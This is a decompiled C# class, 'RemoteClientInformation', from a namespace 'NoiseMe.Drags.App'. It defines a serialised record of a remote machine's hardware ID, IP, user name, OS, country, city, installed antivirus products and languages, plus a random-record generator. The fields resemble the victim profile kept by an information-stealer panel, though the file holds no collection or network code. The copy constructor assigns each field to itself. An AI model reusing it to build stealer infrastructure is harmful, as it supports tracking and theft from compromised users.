using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x0200016C RID: 364
	[ProtoContract(Name = "RemoteClientInformation")]
	public class RemoteClientInformation : INotifyPropertyChanged, IEqualityComparer<RemoteClientInformation>
	{
		// Token: 0x06000BA4 RID: 2980 RVA: 0x000022E5 File Offset: 0x000004E5
		public RemoteClientInformation()
		{
		}

		// Token: 0x06000BA5 RID: 2981 RVA: 0x00023218 File Offset: 0x00021418
		public RemoteClientInformation(RemoteClientInformation remoteClientInformation)
		{
			this.ID = this.ID;
			this.HardwareID = this.HardwareID;
			this.ClientIP = this.ClientIP;
			this.UserName = this.UserName;
			this.SourceID = this.SourceID;
			this.OperationSystem = this.OperationSystem;
			this.Country = this.Country;
			this.Hardwares = this.Hardwares;
			this.LogTime = this.LogTime;
			this.Antiviruses = this.Antiviruses;
			this.Languages = this.Languages;
			this.CurrentLanguage = this.CurrentLanguage;
			this.MonitorSize = this.MonitorSize;
			this.TimeZone = this.TimeZone;
			this.City = this.City;
		}

		// Token: 0x170002E5 RID: 741
		// (get) Token: 0x06000BA6 RID: 2982 RVA: 0x00008FC0 File Offset: 0x000071C0
		// (set) Token: 0x06000BA7 RID: 2983 RVA: 0x00008FC8 File Offset: 0x000071C8
		[ProtoMember(1, Name = "ID")]
		public int ID
		{
			get
			{
				return this._iD;
			}
			set
			{
				this._iD = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("ID"));
			}
		}

		// Token: 0x170002E6 RID: 742
		// (get) Token: 0x06000BA8 RID: 2984 RVA: 0x00008FEC File Offset: 0x000071EC
		// (set) Token: 0x06000BA9 RID: 2985 RVA: 0x00008FF4 File Offset: 0x000071F4
		[ProtoMember(2, Name = "HardwareID")]
		public string HardwareID
		{
			get
			{
				return this._hardwareID;
			}
			set
			{
				this._hardwareID = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		// Token: 0x170002E7 RID: 743
		// (get) Token: 0x06000BAA RID: 2986 RVA: 0x00009018 File Offset: 0x00007218
		// (set) Token: 0x06000BAB RID: 2987 RVA: 0x00009020 File Offset: 0x00007220
		[ProtoMember(3, Name = "ClientIP")]
		public string ClientIP
		{
			get
			{
				return this._clientIP;
			}
			set
			{
				this._clientIP = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("HardwareID"));
			}
		}

		// Token: 0x170002E8 RID: 744
		// (get) Token: 0x06000BAC RID: 2988 RVA: 0x00009044 File Offset: 0x00007244
		// (set) Token: 0x06000BAD RID: 2989 RVA: 0x0000904C File Offset: 0x0000724C
		[ProtoMember(4, Name = "UserName")]
		public string UserName
		{
			get
			{
				return this._userName;
			}
			set
			{
				this._userName = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("UserName"));
			}
		}

		// Token: 0x170002E9 RID: 745
		// (get) Token: 0x06000BAE RID: 2990 RVA: 0x00009070 File Offset: 0x00007270
		// (set) Token: 0x06000BAF RID: 2991 RVA: 0x00009078 File Offset: 0x00007278
		[ProtoMember(5, Name = "SourceID")]
		public string SourceID
		{
			get
			{
				return this._sourceID;
			}
			set
			{
				this._sourceID = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("SourceID"));
			}
		}

		// Token: 0x170002EA RID: 746
		// (get) Token: 0x06000BB0 RID: 2992 RVA: 0x0000909C File Offset: 0x0000729C
		// (set) Token: 0x06000BB1 RID: 2993 RVA: 0x000090A4 File Offset: 0x000072A4
		[ProtoMember(6, Name = "OperationSystem")]
		public string OperationSystem
		{
			get
			{
				return this._operationSystem;
			}
			set
			{
				this._operationSystem = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("OperationSystem"));
			}
		}

		// Token: 0x170002EB RID: 747
		// (get) Token: 0x06000BB2 RID: 2994 RVA: 0x000090C8 File Offset: 0x000072C8
		// (set) Token: 0x06000BB3 RID: 2995 RVA: 0x000090D0 File Offset: 0x000072D0
		[ProtoMember(7, Name = "Country")]
		public string Country
		{
			get
			{
				return this._country;
			}
			set
			{
				this._country = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Country"));
			}
		}

		// Token: 0x170002EC RID: 748
		// (get) Token: 0x06000BB4 RID: 2996 RVA: 0x000232E0 File Offset: 0x000214E0
		// (set) Token: 0x06000BB5 RID: 2997 RVA: 0x000090F4 File Offset: 0x000072F4
		[ProtoMember(8, Name = "Hardwares")]
		public List<Hardware> Hardwares
		{
			get
			{
				List<Hardware> result;
				if ((result = this._hardwares) == null)
				{
					result = (this._hardwares = new List<Hardware>());
				}
				return result;
			}
			set
			{
				this._hardwares = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Hardwares"));
			}
		}

		// Token: 0x170002ED RID: 749
		// (get) Token: 0x06000BB6 RID: 2998 RVA: 0x00009118 File Offset: 0x00007318
		// (set) Token: 0x06000BB7 RID: 2999 RVA: 0x00009120 File Offset: 0x00007320
		[ProtoMember(9, Name = "LogTime")]
		public DateTime LogTime
		{
			get
			{
				return this._logTime;
			}
			set
			{
				this._logTime = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("LogTime"));
			}
		}

		// Token: 0x170002EE RID: 750
		// (get) Token: 0x06000BB8 RID: 3000 RVA: 0x00023308 File Offset: 0x00021508
		// (set) Token: 0x06000BB9 RID: 3001 RVA: 0x00009144 File Offset: 0x00007344
		[ProtoMember(10, Name = "Antiviruses")]
		public List<string> Antiviruses
		{
			get
			{
				List<string> result;
				if ((result = this._antiviruses) == null)
				{
					result = (this._antiviruses = new List<string>());
				}
				return result;
			}
			set
			{
				this._antiviruses = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Antiviruses"));
			}
		}

		// Token: 0x170002EF RID: 751
		// (get) Token: 0x06000BBA RID: 3002 RVA: 0x00009168 File Offset: 0x00007368
		// (set) Token: 0x06000BBB RID: 3003 RVA: 0x00009170 File Offset: 0x00007370
		[ProtoMember(11, Name = "Languages")]
		public List<string> Languages
		{
			get
			{
				return this._languages;
			}
			set
			{
				this._languages = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Languages"));
			}
		}

		// Token: 0x170002F0 RID: 752
		// (get) Token: 0x06000BBC RID: 3004 RVA: 0x00009194 File Offset: 0x00007394
		// (set) Token: 0x06000BBD RID: 3005 RVA: 0x0000919C File Offset: 0x0000739C
		[ProtoMember(12, Name = "CurrentLanguage")]
		public string CurrentLanguage
		{
			get
			{
				return this._currentLanguage;
			}
			set
			{
				this._currentLanguage = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("CurrentLanguage"));
			}
		}

		// Token: 0x170002F1 RID: 753
		// (get) Token: 0x06000BBE RID: 3006 RVA: 0x000091C0 File Offset: 0x000073C0
		// (set) Token: 0x06000BBF RID: 3007 RVA: 0x000091C8 File Offset: 0x000073C8
		[ProtoMember(13, Name = "MonitorSize")]
		public string MonitorSize
		{
			get
			{
				return this._monitorSize;
			}
			set
			{
				this._monitorSize = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("MonitorSize"));
			}
		}

		// Token: 0x170002F2 RID: 754
		// (get) Token: 0x06000BC0 RID: 3008 RVA: 0x000091EC File Offset: 0x000073EC
		// (set) Token: 0x06000BC1 RID: 3009 RVA: 0x000091F4 File Offset: 0x000073F4
		[ProtoMember(14, Name = "TimeZone")]
		public string TimeZone
		{
			get
			{
				return this._timeZone;
			}
			set
			{
				this._timeZone = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("TimeZone"));
			}
		}

		// Token: 0x170002F3 RID: 755
		// (get) Token: 0x06000BC2 RID: 3010 RVA: 0x00009218 File Offset: 0x00007418
		// (set) Token: 0x06000BC3 RID: 3011 RVA: 0x00009220 File Offset: 0x00007420
		[ProtoMember(15, Name = "City")]
		public string City
		{
			get
			{
				return this._city;
			}
			set
			{
				this._city = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("City"));
			}
		}

		// Token: 0x14000024 RID: 36
		// (add) Token: 0x06000BC4 RID: 3012 RVA: 0x00023330 File Offset: 0x00021530
		// (remove) Token: 0x06000BC5 RID: 3013 RVA: 0x00023368 File Offset: 0x00021568
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000BC6 RID: 3014 RVA: 0x000233A0 File Offset: 0x000215A0
		public static RemoteClientInformation CreateRandom()
		{
			return new RemoteClientInformation
			{
				ClientIP = string.Format("{0}.{1}.{2}.{3}", new object[]
				{
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255),
					RemoteClientInformation._random.Next(0, 255)
				}),
				Country = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 2),
				HardwareID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 20),
				Hardwares = new List<Hardware>(),
				LogTime = DateTime.Now,
				OperationSystem = "WIN10 " + RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM", 5) + " Edition",
				SourceID = RemoteClientInformation.RandomString("QWERTYUIOPASDFGHJKLZXCVBNM" + RemoteClientInformation._lowerChars, 6),
				UserName = RemoteClientInformation.RandomString(RemoteClientInformation._lowerChars, 10)
			};
		}

		// Token: 0x06000BC7 RID: 3015 RVA: 0x000234B0 File Offset: 0x000216B0
		private static string RandomString(string sourceChars, int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(sourceChars[RemoteClientInformation._random.Next(0, sourceChars.Length - 1)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000BC8 RID: 3016 RVA: 0x00009244 File Offset: 0x00007444
		public bool Equals(RemoteClientInformation x, RemoteClientInformation y)
		{
			return x.HardwareID == y.HardwareID;
		}

		// Token: 0x06000BC9 RID: 3017 RVA: 0x000234F8 File Offset: 0x000216F8
		public int GetHashCode(RemoteClientInformation obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.HardwareID))
			{
				num += obj.HardwareID.GetHashCode();
			}
			return num;
		}

		// Token: 0x0400047D RID: 1149
		private static readonly Random _random = new Random();

		// Token: 0x0400047E RID: 1150
		private const string _upperChars = "QWERTYUIOPASDFGHJKLZXCVBNM";

		// Token: 0x0400047F RID: 1151
		private static readonly string _lowerChars = "QWERTYUIOPASDFGHJKLZXCVBNM".ToLower();

		// Token: 0x04000480 RID: 1152
		private int _iD;

		// Token: 0x04000481 RID: 1153
		private string _city;

		// Token: 0x04000482 RID: 1154
		private string _currentLanguage;

		// Token: 0x04000483 RID: 1155
		private string _monitorSize;

		// Token: 0x04000484 RID: 1156
		private string _timeZone;

		// Token: 0x04000485 RID: 1157
		private string _hardwareID;

		// Token: 0x04000486 RID: 1158
		private string _clientIP;

		// Token: 0x04000487 RID: 1159
		private string _userName;

		// Token: 0x04000488 RID: 1160
		private string _sourceID;

		// Token: 0x04000489 RID: 1161
		private string _operationSystem;

		// Token: 0x0400048A RID: 1162
		private string _country;

		// Token: 0x0400048B RID: 1163
		private List<Hardware> _hardwares;

		// Token: 0x0400048C RID: 1164
		private DateTime _logTime;

		// Token: 0x0400048D RID: 1165
		private List<string> _antiviruses;

		// Token: 0x0400048E RID: 1166
		private List<string> _languages;
	}
}
